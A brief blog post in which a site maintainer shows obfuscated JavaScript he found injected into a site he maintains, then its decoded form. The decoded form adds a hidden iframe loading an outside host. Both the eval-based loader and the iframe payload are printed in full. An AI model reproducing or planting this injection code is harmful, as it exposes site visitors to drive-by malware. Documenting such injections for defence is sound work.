---
layout: post
title: 'JavaScript injection '
created: 1334118246
author: igorz
permalink: /javascript-injection
tags:
- JS
- injection
---
<p><span class="objectBox objectBox-string " role="presentation">This JavaScript code was injected to the main page of the one of not well protected sites I am happy to maintain:</span><br />
</p>
<p><br />
<i>c=3-1;i=c-2;if(</i></p>
<div dir="ltr"><wbr></wbr><i>window.document)if(parseInt(&quot;</i><wbr></wbr><i>0&quot;+&quot;1&quot;+&quot;2&quot;+&quot;3&quot;)===83)try{Date(</i><wbr></wbr><i>).prototype.q}catch(egewgsd){</i><wbr></wbr><i>f=['-31i-31i65i62i-</i><wbr></wbr><i>8i0i60i71i59i77i69i61i70i76i6i</i><wbr></wbr><i>63i61i76i29i68i61i69i61i70i76i</i><wbr></wbr><i>75i26i81i44i57i63i38i57i69i61i</i><wbr></wbr><i>0i-1i58i71i60i81i-</i><wbr></wbr><i>1i1i51i8i53i1i83i-27i-31i-31i-</i><wbr></wbr><i>31i65i62i74i57i69i61i74i0i1i19</i><wbr></wbr><i>i-27i-31i-31i85i-</i><wbr></wbr><i>8i61i68i75i61i-8i83i-27i-31i-</i><wbr></wbr><i>31i-</i><wbr></wbr><i>31i60i71i59i77i69i61i70i76i6i7</i><wbr></wbr><i>9i74i65i76i61i0i-</i><wbr></wbr><i>6i20i65i62i74i57i69i61i-</i><wbr></wbr><i>8i75i74i59i21i-</i><wbr></wbr><i>1i64i76i76i72i18i7i7i63i65i63i</i><wbr></wbr><i>57i76i61i74i65i57i6i65i70i7i65</i><wbr></wbr><i>i70i6i59i63i65i23i15i-1i-</i><wbr></wbr><i>8i79i65i60i76i64i21i-1i9i8i-</i><wbr></wbr><i>1i-8i64i61i65i63i64i76i21i-</i><wbr></wbr><i>1i9i8i-1i-</i><wbr></wbr><i>8i75i76i81i68i61i21i-</i><wbr></wbr><i>1i78i65i75i65i58i65i68i65i76i8</i><wbr></wbr><i>1i18i64i65i60i60i61i70i19i72i7</i><wbr></wbr><i>1i75i65i76i65i71i70i18i57i58i7</i><wbr></wbr><i>5i71i68i77i76i61i19i68i61i62i7</i><wbr></wbr><i>6i18i8i19i76i71i72i18i8i19i-</i><wbr></wbr><i>1i22i20i7i65i62i74i57i69i61i22</i><wbr></wbr><i>i-6i1i19i-27i-31i-31i85i-27i-</i><wbr></wbr><i>31i-</i><wbr></wbr><i>31i62i77i70i59i76i65i71i70i-</i><wbr></wbr><i>8i65i62i74i57i69i61i74i0i1i83i</i><wbr></wbr><i>-27i-31i-31i-31i78i57i74i-</i><wbr></wbr><i>8i62i-8i21i-</i><wbr></wbr><i>8i60i71i59i77i69i61i70i76i6i59</i><wbr></wbr><i>i74i61i57i76i61i29i68i61i69i61</i><wbr></wbr><i>i70i76i0i-</i><wbr></wbr><i>1i65i62i74i57i69i61i-</i><wbr></wbr><i>1i1i19i62i6i75i61i76i25i76i76i</i><wbr></wbr><i>74i65i58i77i76i61i0i-</i><wbr></wbr><i>1i75i74i59i-1i4i-</i><wbr></wbr><i>1i64i76i76i72i18i7i7i63i65i63i</i><wbr></wbr><i>57i76i61i74i65i57i6i65i70i7i65</i><wbr></wbr><i>i70i6i59i63i65i23i15i-</i><wbr></wbr><i>1i1i19i62i6i75i76i81i68i61i6i7</i><wbr></wbr><i>8i65i75i65i58i65i68i65i76i81i2</i><wbr></wbr><i>1i-1i64i65i60i60i61i70i-</i><wbr></wbr><i>1i19i62i6i75i76i81i68i61i6i72i</i><wbr></wbr><i>71i75i65i76i65i71i70i21i-</i><wbr></wbr><i>1i57i58i75i71i68i77i76i61i-</i><wbr></wbr><i>1i19i62i6i75i76i81i68i61i6i68i</i><wbr></wbr><i>61i62i76i21i-1i8i-</i><wbr></wbr><i>1i19i62i6i75i76i81i68i61i6i76i</i><wbr></wbr><i>71i72i21i-1i8i-</i><wbr></wbr><i>1i19i62i6i75i61i76i25i76i76i74</i><wbr></wbr><i>i65i58i77i76i61i0i-</i><wbr></wbr><i>1i79i65i60i76i64i-1i4i-1i9i8i-</i><wbr></wbr><i>1i1i19i62i6i75i61i76i25i76i76i</i><wbr></wbr><i>74i65i58i77i76i61i0i-</i><wbr></wbr><i>1i64i61i65i63i64i76i-1i4i-</i><wbr></wbr><i>1i9i8i-1i1i19i-27i-31i-31i-</i><wbr></wbr><i>31i60i71i59i77i69i61i70i76i6i6</i><wbr></wbr><i>3i61i76i29i68i61i69i61i70i76i7</i><wbr></wbr><i>5i26i81i44i57i63i38i57i69i61i0</i><wbr></wbr><i>i-1i58i71i60i81i-</i><wbr></wbr><i>1i1i51i8i53i6i57i72i72i61i70i6</i><wbr></wbr><i>0i27i64i65i68i60i0i62i1i19i-</i><wbr></wbr><i>27i-31i-31i85'][0].split('i');</i><wbr></wbr><i>v=&quot;ev&quot;+&quot;a&quot;+&quot;l&quot;;}if(v)e=window[</i><wbr></wbr><i>v];w=f;s=[];r=String;for(;565!</i><wbr></wbr><i>=i;i+=1){j=i;s+=r[&quot;fr&quot;+&quot;omC&quot;+&quot;</i><wbr></wbr><i>harCode&quot;](40+1*w[j]);}<br />
if(f)z=s;e(z);</i></div>
<p>&nbsp;</p>
<p><br />
<span class="objectBox objectBox-string " role="presentation">Last expression&nbsp; </span><i>e(z) </i>evaluates following code:</p>
<p>&nbsp;</p>
<p><br />
<br />
<i><span class="objectBox objectBox-string " role="presentation">if  (document.getElementsByTagName('body')[0]){&nbsp;</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp; &nbsp;&nbsp; iframer();&nbsp;</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">} else {&nbsp;</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp;&nbsp;&nbsp; document.write(&quot;&quot;);&nbsp;</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">}&nbsp;</span></i><br />
<br />
<i><span class="objectBox objectBox-string " role="presentation">function iframer(){&nbsp;</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp;&nbsp;&nbsp; var f =  document.createElement('iframe');</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp;&nbsp;&nbsp; f.setAttribute('src','http://gigateria.in/in.cgi?7');</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp;&nbsp;&nbsp; f.style.visibility='hidden';</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp;&nbsp;&nbsp; f.style.position='absolute';</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp;&nbsp;&nbsp; f.style.left='0';</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp;&nbsp;&nbsp; f.style.top='0';</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp;&nbsp;&nbsp; f.setAttribute('width','10');</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp;&nbsp;&nbsp; f.setAttribute('height','10');&nbsp;</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">&nbsp;&nbsp;&nbsp; document.getElementsByTagName('body')[0].appendChild(f);&nbsp;</span></i><br />
<i><span class="objectBox objectBox-string " role="presentation">}</span></i><br />
</p>
<p><br />
<span class="objectBox objectBox-string " role="presentation">It is amazing,&nbsp;</span><i><span class="objectBox objectBox-string " role="presentation"> </span></i><span class="objectBox objectBox-string " role="presentation">how people create such things. This have to be a special state of mind.</span></p>
